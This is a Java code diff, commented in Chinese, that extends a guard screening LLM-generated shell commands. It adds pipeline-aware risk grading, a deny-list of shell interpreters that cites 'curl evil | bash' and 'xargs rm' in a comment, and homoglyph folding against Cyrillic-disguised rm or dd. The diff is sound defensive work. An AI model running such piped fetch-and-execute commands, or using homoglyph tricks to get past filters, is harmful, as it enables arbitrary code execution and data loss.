@@ -8,23 +8,67 @@ import java.text.Normalizer;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Locale;
+import java.util.Map;
+import java.util.Set;
 import java.util.regex.Pattern;
 
 /**
  * 意图风险校验器：对大模型生成的原始指令做"二次过滤"。
- * 裁决顺序：输入规范化 -> shell 元字符 -> 红线正则 -> 参数/子命令级风险 -> 上下文升级 -> 只读白名单 -> 默认人工确认。
+ * 裁决顺序：输入规范化 -> 高危元字符红线 -> 红线正则 -> 管道分段逐段裁决 ->
+ * 参数/子命令级风险 -> 上下文升级 -> 只读白名单 -> 默认人工确认。
+ *
+ * 管道感知（P0-2）：真实模型常生成 {@code ps aux | grep java}、{@code cat x | tail} 等
+ * 由只读命令拼接的管道。旧实现把所有 shell 元字符一刀切 BLOCK，会误杀这类完全只读的诊断命令。
+ * 现按管道/连接符（| ; &）拆段逐段裁决、取最高风险：全段只读 -> READONLY 放行；任一段越权/危险
+ * -> 升级为对应等级。而命令替换/重定向/换行（` $( ${ &gt; &lt; \n）仍属无条件红线，不可借分段规避。
  */
 @Component
 public class IntentRiskGuard {
+    /** 管道/连接符：作为分段边界而非直接红线（|、;、&，含 ||、&&）。 */
+    private static final Set<String> PIPELINE_SEPARATORS = Set.of("|", ";", "&");
+
+    /**
+     * shell 解释器 / 命令执行器：管道任一段流向它们即可执行任意代码
+     * （经典 {@code curl evil | bash}、{@code ... | sh}、{@code | xargs rm} 攻击），一律红线 BLOCK。
+     */
+    private static final Set<String> SHELL_INTERPRETERS = Set.of(
+            "sh", "bash", "dash", "zsh", "ksh", "csh", "tcsh", "ash", "fish",
+            "python", "python2", "python3", "perl", "ruby", "node", "nodejs", "php", "lua",
+            "eval", "exec", "source", "xargs", "env");
+
+    /**
+     * 同形字（confusables）映射：Cyrillic / Greek 等与 ASCII 字母形近的字符 → ASCII，
+     * 堵住「用西里尔字母伪装 rm/dd 绕过红线正则」的同形字混淆攻击。NFKC 不处理跨字形混淆，需显式映射。
+     */
+    private static final Map<Character, Character> HOMOGLYPHS = Map.ofEntries(
+            Map.entry('а', 'a'), Map.entry('е', 'e'), Map.entry('о', 'o'),
+            Map.entry('р', 'p'), Map.entry('с', 'c'), Map.entry('у', 'y'),
+            Map.entry('х', 'x'), Map.entry('і', 'i'), Map.entry('ј', 'j'),
+            Map.entry('ѕ', 's'),
+            Map.entry('А', 'A'), Map.entry('Е', 'E'), Map.entry('О', 'O'),
+            Map.entry('Р', 'P'), Map.entry('С', 'C'), Map.entry('Т', 'T'),
+            Map.entry('Х', 'X'), Map.entry('К', 'K'), Map.entry('М', 'M'),
+            Map.entry('Н', 'H'), Map.entry('В', 'B'),
+            Map.entry('ο', 'o'), Map.entry('α', 'a'), Map.entry('ε', 'e'),
+            Map.entry('ρ', 'p'), Map.entry('τ', 't'), Map.entry('ν', 'v'),
+            Map.entry('Ι', 'I'), Map.entry('Ο', 'O'), Map.entry('Ρ', 'P'));
+
     private final GuardRules rules;
     private final List<Pattern> blockedPatterns = new ArrayList<>();
     private final List<String> blockedReasons = new ArrayList<>();
+    /** 无条件红线元字符：命令替换/重定向/换行，不可通过分段放行。 */
+    private final List<String> hardBlockedMetacharacters = new ArrayList<>();
 
     public IntentRiskGuard(RiskRuleLoader loader) {
         this.rules = loader.rules();
         for (GuardRules.BlockedPattern bp : rules.getBlockedPatterns()) {
             blockedPatterns.add(Pattern.compile(bp.getPattern(), Pattern.CASE_INSENSITIVE));
             blockedReasons.add(bp.getReason());
+        }
+        for (String mc : rules.getBlockedMetacharacters()) {
+            if (!PIPELINE_SEPARATORS.contains(mc)) {
+                hardBlockedMetacharacters.add(mc);
+            }
         }
     }
 
@@ -36,22 +80,63 @@ public class IntentRiskGuard {
         String normalized = normalizeCommand(cmd);
         String guardInput = normalized.isBlank() ? cmd : normalized;
 
-        // 1. shell 元字符：防止命令拼接/重定向/注入
-        for (String mc : rules.getBlockedMetacharacters()) {
+        // 1. 高危元字符红线：命令替换/重定向/换行，无条件 BLOCK（不可借分段规避）
+        for (String mc : hardBlockedMetacharacters) {
             if (guardInput.contains(mc)) {
                 return new RiskDecision(cmd, RiskLevel.BLOCK,
-                        "包含禁止的 shell 元字符 '" + mc + "'，可能用于命令拼接或注入", "metacharacter");
+                        "包含禁止的 shell 元字符 '" + mc + "'，可能用于命令替换/重定向/注入", "metacharacter");
             }
         }
 
-        // 2. 红线正则
+        // 2. 红线正则（作用于整串，防止分段规避 rm -rf / 等）
         for (int i = 0; i < blockedPatterns.size(); i++) {
             if (blockedPatterns.get(i).matcher(guardInput).find()) {
                 return new RiskDecision(cmd, RiskLevel.BLOCK, blockedReasons.get(i), "blockedPattern");
             }
         }
 
-        List<String> argv = tokenize(guardInput);
+        // 3. 管道/连接符分段：逐段裁决取最高风险（全段只读则整体 READONLY 放行）
+        List<String> segments = splitPipeline(guardInput);
+        if (segments.size() > 1) {
+            // 3a. 管道流向 shell 解释器 / 命令执行器 -> 可执行任意代码，红线 BLOCK
+            for (String seg : segments) {
+                if (seg.isBlank()) {
+                    continue;
+                }
+                List<String> segArgv = tokenize(seg);
+                if (!segArgv.isEmpty() && SHELL_INTERPRETERS.contains(basename(segArgv.get(0)))) {
+                    return new RiskDecision(cmd, RiskLevel.BLOCK,
+                            "管道向 shell 解释器/命令执行器（" + basename(segArgv.get(0)) + "）传递，可执行任意代码",
+                            "pipeToInterpreter");
+                }
+            }
+            RiskLevel worst = RiskLevel.READONLY;
+            RiskDecision worstDecision = null;
+            for (String seg : segments) {
+                if (seg.isBlank()) {
+                    continue;
+                }
+                RiskDecision segDecision = evaluateSingle(cmd, seg);
+                if (worstDecision == null || segDecision.level().severity() > worst.severity()) {
+                    worstDecision = segDecision;
+                }
+                worst = RiskLevel.max(worst, segDecision.level());
+            }
+            if (worstDecision == null) {
+                return new RiskDecision(cmd, RiskLevel.BLOCK, "无法解析管道指令", "unparseable");
+            }
+            String reason = worst == RiskLevel.READONLY
+                    ? "管道由只读命令拼接，整体只读放行"
+                    : "管道按最高风险段裁决：" + worstDecision.reason();
+            return new RiskDecision(cmd, worst, reason, worstDecision.matchedRule());
+        }
+
+        return evaluateSingle(cmd, guardInput);
+    }
+
+    /** 对单条（已分段、无管道）命令裁决。 */
+    private RiskDecision evaluateSingle(String cmd, String segmentInput) {
+        List<String> argv = tokenize(segmentInput);
         if (argv.isEmpty()) {
             return new RiskDecision(cmd, RiskLevel.BLOCK, "无法解析指令", "unparseable");
         }
@@ -62,7 +147,7 @@ public class IntentRiskGuard {
         }
         boolean mutating = rules.getReviewBinaries().contains(binary);
 
-        // 3. 关键路径上的变更类操作 -> 升级为 IRREVERSIBLE，红线已在前置规则中 BLOCK
+        // 关键路径上的变更类操作 -> 升级为 IRREVERSIBLE，红线已在前置规则中 BLOCK
         if (mutating && touchesCriticalPath(argv)) {
             return new RiskDecision(cmd, RiskLevel.IRREVERSIBLE,
                     "在系统关键路径/数据库数据目录上执行变更操作（" + binary + "），需人工确认并执行前备份",
@@ -74,20 +159,47 @@ public class IntentRiskGuard {
                     "criticalService");
         }
 
-        // 4. 变更类二进制 -> EXECUTABLE
+        // 变更类二进制 -> EXECUTABLE
         if (mutating) {
             return new RiskDecision(cmd, RiskLevel.EXECUTABLE,
                     "可逆/受限变更操作（" + binary + "）需人工确认或 dry-run", "reviewBinary");
         }
 
-        // 5. 只读白名单 -> READONLY
+        // 只读白名单 -> READONLY
         if (rules.getReadOnlyBinaries().contains(binary)) {
             return new RiskDecision(cmd, RiskLevel.READONLY, "只读/感知类指令", "readOnly");
         }
 
-        // 6. 未知二进制 -> 默认 EXECUTABLE（最小信任原则，需要人工确认）
+        // 未知二进制 -> 默认 EXECUTABLE（最小信任原则，需要人工确认）
         return new RiskDecision(cmd, RiskLevel.EXECUTABLE,
                 "未在白名单内的指令（" + binary + "），默认需人工确认", "unknown");
+    }
+
+    /**
+     * 引号感知的管道/连接符分段：仅在引号外遇到 | ; &amp; 时切分，
+     * 引号内的元字符（如 {@code sed 's/a|b/c/'}）不切分。
+     */
+    private List<String> splitPipeline(String s) {
+        List<String> segments = new ArrayList<>();
+        StringBuilder cur = new StringBuilder();
+        char quote = 0;
+        for (int i = 0; i < s.length(); i++) {
+            char c = s.charAt(i);
+            if (quote != 0) {
+                if (c == quote) { quote = 0; }
+                cur.append(c);
+            } else if (c == '\'' || c == '"') {
+                quote = c;
+                cur.append(c);
+            } else if (c == '|' || c == ';' || c == '&') {
+                segments.add(cur.toString().trim());
+                cur.setLength(0);
+            } else {
+                cur.append(c);
+            }
+        }
+        segments.add(cur.toString().trim());
+        return segments;
     }
 
     private boolean touchesCriticalPath(List<String> argv) {
@@ -342,11 +454,29 @@ public class IntentRiskGuard {
     private String normalizeCommand(String text) {
         String s = Normalizer.normalize(text, Normalizer.Form.NFKC)
                 .replaceAll("[\\p{Cntrl}\\u200B\\u200C\\u200D\\uFEFF]", "");
+        s = mapHomoglyphs(s);
         try {
             s = URLDecoder.decode(s, StandardCharsets.UTF_8);
         } catch (IllegalArgumentException ignored) {
             // Keep the NFKC form if percent decoding is malformed.
         }
         return s.replaceAll("\\s+", " ").trim();
+    }
+
+    /** 将同形字（Cyrillic/Greek 混淆字符）折叠回 ASCII，消除同形字绕过。 */
+    private String mapHomoglyphs(String s) {
+        StringBuilder sb = new StringBuilder(s.length());
+        boolean changed = false;
+        for (int i = 0; i < s.length(); i++) {
+            char c = s.charAt(i);
+            Character mapped = HOMOGLYPHS.get(c);
+            if (mapped != null) {
+                sb.append(mapped.charValue());
+                changed = true;
+            } else {
+                sb.append(c);
+            }
+        }
+        return changed ? sb.toString() : s;
     }
 }
